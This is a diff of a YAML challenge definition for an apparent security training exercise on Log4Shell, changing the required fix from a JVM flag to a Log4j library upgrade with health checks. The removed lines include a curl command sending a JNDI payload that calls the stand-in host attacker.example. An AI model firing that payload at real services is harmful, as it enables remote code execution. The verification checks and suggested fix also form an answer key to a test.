@@ -1,6 +1,6 @@
 id: log4shell_cve
 name: Log4Shell (CVE-2021-44228)
-description: The application uses Log4j 2.14.1 which is vulnerable to CVE-2021-44228 (Log4Shell). JNDI lookup strings in log messages trigger outbound LDAP requests, enabling remote code execution. The fix is to add the JVM flag -Dlog4j2.formatMsgNoLookups=true.
+description: The application bundles Log4j 2.14.1, which is vulnerable to CVE-2021-44228. Upgrade both log4j-core and log4j-api to 2.17.1 or later while keeping the logging service healthy. The historical formatMsgNoLookups flag is not accepted as the root-cause fix.
 type: vulnerability
 difficulty: hard
 points: 300
@@ -10,27 +10,36 @@ conflicts: []
 requires: [log4shell_app]
 script: log4shell_cve.sh
 verification:
-  type: file_contains
-  path: /etc/systemd/system/logapp.service
-  pattern: "formatMsgNoLookups=true"
-suggested_fix: "Edit /etc/systemd/system/logapp.service and add -Dlog4j2.formatMsgNoLookups=true to the ExecStart JVM arguments, then run: systemctl daemon-reload && systemctl restart logapp"
+  type: all_of
+  checks:
+    - type: jar_library_version
+      path: /opt/logapp/logapp.jar
+      library: log4j-core
+      minimum: 2.17.1
+    - type: jar_library_version
+      path: /opt/logapp/logapp.jar
+      library: log4j-api
+      minimum: 2.17.1
+    - type: service_running
+      service: logapp
+      expected: active
+    - type: http_response
+      port: 8081
+      path: /actuator/health
+      status_code: 200
+suggested_fix: "Replace the bundled log4j-core and log4j-api 2.14.1 libraries with version 2.17.1 or later, rebuild the application JAR, restart logapp, and confirm /actuator/health remains healthy. formatMsgNoLookups is historical mitigation context only."
 hints:
   - "Research known vulnerabilities in the Java logging framework used by this application"
   - "Check the Log4j version bundled in /opt/logapp/logapp.jar — version 2.14.1 is affected by CVE-2021-44228"
-  - "Add the JVM flag -Dlog4j2.formatMsgNoLookups=true to the ExecStart line in /etc/systemd/system/logapp.service, then daemon-reload and restart the service"
-caldera:
-  tactic: initial-access
-  technique:
-    attack_id: T1190
-    name: "Exploit Public-Facing Application"
-  recon:
-    description: "Check if Log4Shell mitigation is applied in the service unit"
-    command: |
-      grep -q "formatMsgNoLookups=true" /etc/systemd/system/logapp.service && echo "SECURE: Log4Shell mitigation is applied" || echo "VULNERABLE: Log4Shell mitigation not found"
-  exploit:
-    description: "Trigger a Log4Shell JNDI callback via the /log endpoint"
-    command: |
-      curl -s -X POST http://localhost:8081/log \
-        -H "Content-Type: application/json" \
-        -d '{"message": "${jndi:ldap://attacker.example:1389/exploit}", "level": "INFO"}'
-      echo "JNDI callback triggered — check LDAP server for incoming connection"
+  - "Inspect BOOT-INF/lib inside /opt/logapp/logapp.jar, upgrade both Log4j API and Core to 2.17.1 or later, rebuild the archive, and restart logapp"
+learning_objectives:
+  - Distinguish temporary mitigations from a root-cause dependency upgrade
+  - Verify the deployed library version without breaking application health
+estimated_minutes: 75
+references:
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+debrief:
+  root_cause: User-controlled log messages reached JNDI lookup processing in vulnerable Log4j 2.14.1.
+  remediation: Upgrade log4j-core and log4j-api to a fixed release and regression-test the application; JVM flags are not a durable dependency fix.
+  attack_mapping: T1190 — Exploit Public-Facing Application
